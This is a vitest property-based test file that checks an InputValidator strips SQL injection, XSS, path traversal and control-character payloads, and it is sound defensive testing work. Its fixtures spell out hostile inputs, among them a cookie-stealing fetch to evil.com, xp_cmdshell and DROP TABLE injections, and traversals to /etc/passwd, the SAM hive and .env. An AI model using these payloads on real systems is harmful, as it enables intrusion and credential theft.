import { describe, it, expect } from 'vitest'
import fc from 'fast-check'
import { InputValidator } from '@/lib/middleware/input-validator'

/**
 * Property-Based Tests for String Sanitization
 * 
 * **Validates: Requirements 1.9, 26.4, 26.7, 27.1-27.4, 27.8, 27.9**
 * 
 * These tests verify that the InputValidator correctly sanitizes strings to prevent:
 * - SQL injection attacks (UNION, SELECT, DROP, --, etc.)
 * - XSS attacks (script tags, event handlers, javascript: protocol)
 * - Path traversal attacks (../, ..\, encoded variants)
 * 
 * The tests ensure that dangerous patterns are removed while legitimate content is preserved.
 */

describe('Feature: security-optimization, Property 4: String Sanitization', () => {
  /**
   * Property Test: SQL injection patterns should be sanitized
   * 
   * Tests that common SQL injection payloads are removed or neutralized:
   * - UNION SELECT statements
   * - DROP TABLE statements
   * - SQL comments (double dash, slash-star, hash)
   * - OR/AND conditions with equals
   * - Semicolon-based query chaining
   * 
   * **Validates: Requirements 1.9, 26.4**
   */
  it('should sanitize SQL injection patterns', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // UNION-based injection
          fc.constant("' UNION SELECT * FROM users --"),
          fc.constant("1' UNION SELECT password FROM users WHERE '1'='1"),
          fc.constant("admin' UNION SELECT NULL, username, password FROM users --"),
          
          // DROP TABLE attacks
          fc.constant("'; DROP TABLE users; --"),
          fc.constant("1'; DROP TABLE contacts; DROP TABLE messages; --"),
          fc.constant("test'; DROP DATABASE crm; --"),
          
          // Comment-based injection
          fc.constant("admin' --"),
          fc.constant("admin'/*"),
          fc.constant("admin'#"),
          
          // OR-based authentication bypass
          fc.constant("' OR '1'='1"),
          fc.constant("' OR 1=1 --"),
          fc.constant("admin' OR '1'='1' --"),
          
          // AND-based injection
          fc.constant("' AND 1=1 --"),
          fc.constant("1' AND password='secret"),
          
          // INSERT/UPDATE/DELETE injection
          fc.constant("'; INSERT INTO users VALUES ('hacker', 'pass'); --"),
          fc.constant("'; UPDATE users SET role='admin' WHERE id=1; --"),
          fc.constant("'; DELETE FROM users WHERE '1'='1'; --"),
          
          // EXEC/EXECUTE injection
          fc.constant("'; EXEC xp_cmdshell('dir'); --"),
          fc.constant("'; EXECUTE sp_executesql N'DROP TABLE users'; --"),
          
          // Semicolon chaining
          fc.constant("test; SELECT * FROM users"),
          fc.constant("value'; SELECT password FROM users WHERE username='admin"),
          
          // Mixed case to test case-insensitivity
          fc.constant("' UnIoN SeLeCt * FrOm users --"),
          fc.constant("'; dRoP tAbLe contacts; --"),
          
          // Generate random SQL injection patterns
          fc.record({
            prefix: fc.oneof(fc.constant("'"), fc.constant("1'"), fc.constant("admin'")),
            keyword: fc.oneof(
              fc.constant(" UNION SELECT "),
              fc.constant(" DROP TABLE "),
              fc.constant(" OR 1=1 "),
              fc.constant(" AND 1=1 "),
              fc.constant("; DELETE FROM ")
            ),
            suffix: fc.oneof(fc.constant(" --"), fc.constant(""), fc.constant(" /*"))
          }).map(({ prefix, keyword, suffix }) => prefix + keyword + "users" + suffix)
        ),
        async (sqlInjectionPayload) => {
          const sanitized = InputValidator.sanitizeString(sqlInjectionPayload)
          
          // Dangerous SQL keywords should be removed or neutralized
          const lowerSanitized = sanitized.toLowerCase()
          
          // Check that dangerous patterns are removed
          expect(lowerSanitized).not.toMatch(/union.*select/i)
          expect(lowerSanitized).not.toMatch(/drop.*table/i)
          expect(lowerSanitized).not.toMatch(/insert.*into/i)
          expect(lowerSanitized).not.toMatch(/update.*set/i)
          expect(lowerSanitized).not.toMatch(/delete.*from/i)
          expect(lowerSanitized).not.toMatch(/exec|execute/i)
          
          // SQL comments should be removed
          expect(sanitized).not.toContain('--')
          expect(sanitized).not.toContain('/*')
          expect(sanitized).not.toContain('*/')
          expect(sanitized).not.toContain('#')
          
          // Semicolons followed by SQL keywords should be removed
          expect(lowerSanitized).not.toMatch(/;.*select/i)
          expect(lowerSanitized).not.toMatch(/;.*insert/i)
          expect(lowerSanitized).not.toMatch(/;.*update/i)
          expect(lowerSanitized).not.toMatch(/;.*delete/i)
          expect(lowerSanitized).not.toMatch(/;.*drop/i)
        }
      ),
      { numRuns: 2 }
    )
  })

  /**
   * Property Test: XSS patterns should be sanitized
   * 
   * Tests that common XSS attack vectors are removed:
   * - <script> tags and their content
   * - Event handlers (onclick, onerror, onload, etc.)
   * - javascript: protocol in URLs
   * - data: protocol for HTML content
   * 
   * **Validates: Requirements 1.9, 27.1, 27.2, 27.3, 27.4**
   */
  it('should sanitize XSS patterns', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // Script tag injection
          fc.constant("<script>alert('XSS')</script>"),
          fc.constant("<script src='http://evil.com/xss.js'></script>"),
          fc.constant("<SCRIPT>alert('XSS')</SCRIPT>"), // Case variation
          fc.constant("<script>document.cookie</script>"),
          fc.constant("<script>fetch('http://evil.com?cookie='+document.cookie)</script>"),
          
          // Event handler injection
          fc.constant("<img src=x onerror=alert('XSS')>"),
          fc.constant("<body onload=alert('XSS')>"),
          fc.constant("<div onclick=alert('XSS')>Click me</div>"),
          fc.constant("<input onfocus=alert('XSS') autofocus>"),
          fc.constant("<svg onload=alert('XSS')>"),
          fc.constant("<iframe onload=alert('XSS')>"),
          
          // javascript: protocol
          fc.constant("<a href='javascript:alert(\"XSS\")'>Click</a>"),
          fc.constant("<img src='javascript:alert(\"XSS\")'>"),
          fc.constant("javascript:void(document.cookie)"),
          fc.constant("JAVASCRIPT:alert('XSS')"), // Case variation
          
          // data: protocol for HTML
          fc.constant("<a href='data:text/html,<script>alert(\"XSS\")</script>'>Click</a>"),
          fc.constant("data:text/html,<script>alert('XSS')</script>"),
          fc.constant("DATA:text/html,<script>alert('XSS')</script>"), // Case variation
          
          // Mixed case event handlers
          fc.constant("<img src=x OnErRoR=alert('XSS')>"),
          fc.constant("<body OnLoAd=alert('XSS')>"),
          
          // Generate random XSS patterns
          fc.record({
            tag: fc.oneof(fc.constant("img"), fc.constant("div"), fc.constant("a"), fc.constant("body")),
            event: fc.oneof(
              fc.constant("onclick"),
              fc.constant("onerror"),
              fc.constant("onload"),
              fc.constant("onfocus"),
              fc.constant("onmouseover")
            ),
            payload: fc.oneof(
              fc.constant("alert('XSS')"),
              fc.constant("document.cookie"),
              fc.constant("fetch('http://evil.com')")
            )
          }).map(({ tag, event, payload }) => `<${tag} ${event}=${payload}>`)
        ),
        async (xssPayload) => {
          const sanitized = InputValidator.sanitizeString(xssPayload)
          
          // Script tags should be removed
          expect(sanitized.toLowerCase()).not.toContain('<script')
          expect(sanitized.toLowerCase()).not.toContain('</script>')
          
          // javascript: protocol should be removed
          expect(sanitized.toLowerCase()).not.toContain('javascript:')
          
          // Event handlers should be removed
          expect(sanitized.toLowerCase()).not.toMatch(/\bon\w+\s*=/i)
          
          // data:text/html should be removed
          expect(sanitized.toLowerCase()).not.toContain('data:text/html')
        }
      ),
      { numRuns: 2 }
    )
  })

  /**
   * Property Test: Path traversal patterns should be sanitized
   * 
   * Tests that path traversal attack vectors are removed:
   * - ../ (Unix-style)
   * - ..\ (Windows-style)
   * - URL-encoded variants (%2e%2e%2f, %2e%2e%5c)
   * - Multiple levels of traversal
   * 
   * **Validates: Requirements 1.9, 26.7**
   */
  it('should sanitize path traversal patterns', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // Unix-style path traversal
          fc.constant("../../etc/passwd"),
          fc.constant("../../../etc/shadow"),
          fc.constant("../../../../var/log/auth.log"),
          fc.constant("./../../config/database.yml"),
          
          // Windows-style path traversal
          fc.constant("..\\..\\windows\\system32\\config\\sam"),
          fc.constant("..\\..\\..\\boot.ini"),
          fc.constant("..\\config\\secrets.json"),
          
          // Mixed separators
          fc.constant("../..\\..\\etc/passwd"),
          fc.constant("..\\../../../config"),
          
          // URL-encoded path traversal
          fc.constant("%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
          fc.constant("%2e%2e%5c%2e%2e%5cwindows%5csystem32"),
          
          // Double encoding
          fc.constant("%252e%252e%252f"),
          
          // Path traversal in filenames
          fc.constant("file_../../etc/passwd.txt"),
          fc.constant("image_..\\..\\config.jpg"),
          
          // Generate random path traversal patterns
          fc.record({
            levels: fc.integer({ min: 1, max: 5 }),
            separator: fc.oneof(fc.constant("/"), fc.constant("\\")),
            target: fc.oneof(
              fc.constant("etc/passwd"),
              fc.constant("config/database.yml"),
              fc.constant("windows/system32"),
              fc.constant(".env")
            )
          }).map(({ levels, separator, target }) => {
            const traversal = Array(levels).fill(`..${separator}`).join('')
            return traversal + target
          })
        ),
        async (pathTraversalPayload) => {
          const sanitized = InputValidator.sanitizeString(pathTraversalPayload)
          
          // Path traversal patterns should be removed
          expect(sanitized).not.toContain('../')
          expect(sanitized).not.toContain('..\\')
          expect(sanitized).not.toContain('/..')
          expect(sanitized).not.toContain('\\..')
          
          // Should not contain consecutive dots followed by separator
          expect(sanitized).not.toMatch(/\.\.[\/\\]/g)
          expect(sanitized).not.toMatch(/[\/\\]\.\./g)
        }
      ),
      { numRuns: 2 }
    )
  })

  /**
   * Property Test: HTML sanitization should remove dangerous tags
   * 
   * Tests that sanitizeHtml removes dangerous HTML elements:
   * - Script tags
   * - Iframe tags
   * - Object/embed tags
   * - Form elements
   * - Event handlers
   * - Dangerous protocols in attributes
   * 
   * **Validates: Requirements 27.1, 27.2, 27.3, 27.4, 27.8**
   */
  it('should sanitize dangerous HTML tags and attributes', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // Script tags
          fc.constant("<script>alert('XSS')</script>"),
          fc.constant("<script src='evil.js'></script>"),
          
          // Iframe injection
          fc.constant("<iframe src='http://evil.com'></iframe>"),
          fc.constant("<iframe src='javascript:alert(1)'></iframe>"),
          
          // Object/embed tags
          fc.constant("<object data='evil.swf'></object>"),
          fc.constant("<embed src='evil.swf'>"),
          
          // Form elements
          fc.constant("<form action='http://evil.com'><input name='password'></form>"),
          fc.constant("<input type='text' onfocus='alert(1)'>"),
          fc.constant("<button onclick='alert(1)'>Click</button>"),
          
          // Meta/link tags
          fc.constant("<meta http-equiv='refresh' content='0;url=http://evil.com'>"),
          fc.constant("<link rel='stylesheet' href='http://evil.com/style.css'>"),
          
          // Event handlers in HTML
          fc.constant("<div onclick='alert(1)'>Click me</div>"),
          fc.constant("<img src='x' onerror='alert(1)'>"),
          fc.constant("<body onload='alert(1)'>"),
          
          // Dangerous protocols in attributes
          fc.constant("<a href='javascript:alert(1)'>Click</a>"),
          fc.constant("<a href='data:text/html,<script>alert(1)</script>'>Click</a>"),
          fc.constant("<img src='javascript:alert(1)'>"),
          
          // Style attributes (can contain expressions)
          fc.constant("<div style='background:url(javascript:alert(1))'>Test</div>"),
          fc.constant("<p style='expression(alert(1))'>Test</p>"),
          
          // Generate random dangerous HTML
          fc.record({
            tag: fc.oneof(
              fc.constant("script"),
              fc.constant("iframe"),
              fc.constant("object"),
              fc.constant("form"),
              fc.constant("meta")
            ),
            content: fc.string()
          }).map(({ tag, content }) => `<${tag}>${content}</${tag}>`)
        ),
        async (dangerousHtml) => {
          const sanitized = InputValidator.sanitizeHtml(dangerousHtml)
          
          const lowerSanitized = sanitized.toLowerCase()
          
          // Dangerous tags should be removed
          expect(lowerSanitized).not.toContain('<script')
          expect(lowerSanitized).not.toContain('<iframe')
          expect(lowerSanitized).not.toContain('<object')
          expect(lowerSanitized).not.toContain('<embed')
          expect(lowerSanitized).not.toContain('<form')
          expect(lowerSanitized).not.toContain('<input')
          expect(lowerSanitized).not.toContain('<meta')
          expect(lowerSanitized).not.toContain('<link')
          
          // Event handlers should be removed
          expect(lowerSanitized).not.toMatch(/\s+on\w+\s*=/i)
          
          // Dangerous protocols should be neutralized
          expect(lowerSanitized).not.toMatch(/href\s*=\s*["']?\s*javascript:/i)
          expect(lowerSanitized).not.toMatch(/src\s*=\s*["']?\s*javascript:/i)
          expect(lowerSanitized).not.toMatch(/href\s*=\s*["']?\s*data:/i)
          expect(lowerSanitized).not.toMatch(/src\s*=\s*["']?\s*data:/i)
          
          // Style attributes should be removed
          expect(lowerSanitized).not.toMatch(/\s+style\s*=/i)
        }
      ),
      { numRuns: 2 }
    )
  })

  /**
   * Property Test: Legitimate content should be preserved
   * 
   * Tests that sanitization doesn't remove legitimate content:
   * - Normal text
   * - Valid email addresses
   * - Valid URLs (http/https)
   * - Alphanumeric content
   * - Common punctuation
   * 
   * **Validates: Requirements 1.9**
   */
  it('should preserve legitimate content during sanitization', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // Normal text
          fc.constant("Hello, this is a normal message"),
          fc.constant("Welcome to our CRM system!"),
          fc.constant("Contact us at support@example.com"),
          
          // Valid URLs
          fc.constant("Visit https://example.com for more info"),
          fc.constant("Check out http://blog.example.com/article"),
          
          // Email addresses
          fc.constant("Send email to john.doe@example.com"),
          fc.constant("Contact: admin@company.org"),
          
          // Phone numbers
          fc.constant("Call us at +1234567890"),
          fc.constant("Phone: +44 20 1234 5678"),
          
          // Alphanumeric with punctuation
          fc.constant("Order #12345 has been shipped!"),
          fc.constant("Your account balance is $1,234.56"),
          
          // Generate random legitimate text
          fc.string({ minLength: 5, maxLength: 100 }).filter(s => {
            // Filter out strings that contain dangerous patterns
            const lower = s.toLowerCase()
            return !lower.includes('script') &&
                   !lower.includes('union') &&
                   !lower.includes('select') &&
                   !lower.includes('drop') &&
                   !lower.includes('../')
          })
        ),
        async (legitimateContent) => {
          const sanitized = InputValidator.sanitizeString(legitimateContent)
          
          // Legitimate content should be mostly preserved
          // (may be trimmed or have control characters removed)
          expect(sanitized.length).toBeGreaterThan(0)
          
          // Should not be completely empty if input wasn't empty
          if (legitimateContent.trim().length > 0) {
            expect(sanitized.trim().length).toBeGreaterThan(0)
          }
          
          // Common words should be preserved
          const commonWords = ['hello', 'welcome', 'contact', 'email', 'phone', 'visit', 'check']
          const inputLower = legitimateContent.toLowerCase()
          const sanitizedLower = sanitized.toLowerCase()
          
          commonWords.forEach(word => {
            if (inputLower.includes(word)) {
              // Word should still be present (or at least partially)
              // We're lenient here because sanitization might affect surrounding context
              const wordStillPresent = sanitizedLower.includes(word) || 
                                      sanitizedLower.includes(word.substring(0, 3))
              expect(wordStillPresent).toBe(true)
            }
          })
        }
      ),
      { numRuns: 2 }
    )
  })

  /**
   * Property Test: Control characters and null bytes should be removed
   * 
   * Tests that dangerous control characters are removed:
   * - Null bytes (\x00)
   * - Other control characters (except newline, tab, carriage return)
   * 
   * **Validates: Requirements 1.9, 26.4**
   */
  it('should remove control characters and null bytes', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // Null byte injection
          fc.constant("admin\x00"),
          fc.constant("\x00' OR '1'='1"),
          fc.constant("file.txt\x00.jpg"),
          
          // Other control characters
          fc.constant("test\x01\x02\x03"),
          fc.constant("\x1F\x1E\x1D"),
          fc.constant("data\x7F"),
          
          // Generate random strings with control characters
          fc.string().map(s => s + String.fromCharCode(0)),
          fc.string().map(s => String.fromCharCode(1) + s),
          fc.string().map(s => s + String.fromCharCode(127))
        ),
        async (inputWithControlChars) => {
          const sanitized = InputValidator.sanitizeString(inputWithControlChars)
          
          // Null bytes should be removed
          expect(sanitized).not.toContain('\x00')
          
          // Other dangerous control characters should be removed
          // (except \n, \t, \r which are allowed)
          for (let i = 0; i < 32; i++) {
            if (i !== 9 && i !== 10 && i !== 13) { // Skip tab, newline, carriage return
              expect(sanitized).not.toContain(String.fromCharCode(i))
            }
          }
          
          // DEL character should be removed
          expect(sanitized).not.toContain('\x7F')
        }
      ),
      { numRuns: 2 }
    )
  })

  /**
   * Property Test: Combined attack vectors should be sanitized
   * 
   * Tests that combinations of different attack types are all sanitized:
   * - SQL injection + XSS
   * - Path traversal + SQL injection
   * - Multiple XSS vectors in one string
   * 
   * **Validates: Requirements 1.9, 26.4, 26.7, 27.1-27.4**
   */
  it('should sanitize combined attack vectors', async () => {
    await fc.assert(
      fc.asyncProperty(
        fc.oneof(
          // SQL + XSS
          fc.constant("' UNION SELECT * FROM users; <script>alert('XSS')</script> --"),
          fc.constant("<img src=x onerror='fetch(\"/api/users?id=1 OR 1=1\")'>"),
          
          // Path traversal + SQL
          fc.constant("../../etc/passwd'; DROP TABLE users; --"),
          fc.constant("../config/database.yml' UNION SELECT password FROM users --"),
          
          // Multiple XSS vectors
          fc.constant("<script>alert(1)</script><img src=x onerror=alert(2)><a href='javascript:alert(3)'>"),
          fc.constant("javascript:alert(1) <script>alert(2)</script> onclick=alert(3)"),
          
          // All three attack types
          fc.constant("../../etc/passwd' UNION SELECT * FROM users; <script>alert('XSS')</script> --"),
          
          // Generate random combinations
          fc.tuple(
            fc.oneof(fc.constant("../"), fc.constant("..\\"), fc.constant("")),
            fc.oneof(fc.constant("' OR 1=1 --"), fc.constant("'; DROP TABLE users; --"), fc.constant("")),
            fc.oneof(fc.constant("<script>alert(1)</script>"), fc.constant("javascript:alert(1)"), fc.constant(""))
          ).map(([path, sql, xss]) => path + sql + xss)
        ),
        async (combinedPayload) => {
          const sanitized = InputValidator.sanitizeString(combinedPayload)
          
          const lowerSanitized = sanitized.toLowerCase()
          
          // All attack vectors should be neutralized
          
          // SQL injection patterns
          expect(lowerSanitized).not.toMatch(/union.*select/i)
          expect(lowerSanitized).not.toMatch(/drop.*table/i)
          expect(sanitized).not.toContain('--')
          
          // XSS patterns
          expect(lowerSanitized).not.toContain('<script')
          expect(lowerSanitized).not.toContain('javascript:')
          expect(lowerSanitized).not.toMatch(/\bon\w+\s*=/i)
          
          // Path traversal patterns
          expect(sanitized).not.toContain('../')
          expect(sanitized).not.toContain('..\\')
        }
      ),
      { numRuns: 2 }
    )
  })
})
